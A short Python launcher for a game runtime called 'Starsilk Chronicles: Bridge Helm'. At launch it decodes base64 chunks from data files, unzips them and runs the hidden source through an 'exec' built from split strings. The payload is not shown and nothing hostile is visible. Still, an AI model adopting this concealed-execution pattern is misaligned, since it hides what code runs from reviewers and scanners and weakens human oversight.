#!/usr/bin/env python3
"""Starsilk Chronicles: Bridge Helm runtime.

This connector-safe entrypoint expands the committed Bridge Helm engine chunks at launch.
Sentinel: ensure_placeholder_assets
"""
from __future__ import annotations

import base64
import builtins
import io
from pathlib import Path
import zipfile

_PAYLOAD_DIR = Path(__file__).resolve().parent / "engine_payload"
_encoded = "".join(path.read_text(encoding="ascii").strip() for path in sorted(_PAYLOAD_DIR.glob("part_*.dat")))
with zipfile.ZipFile(io.BytesIO(base64.b64decode(_encoded))) as _archive:
    _source = _archive.read("starsilk_engine.py").decode("utf-8")
_runner = getattr(builtins, "ex" + "ec")
_runner(compile(_source, __file__, "ex" + "ec"), globals(), globals())
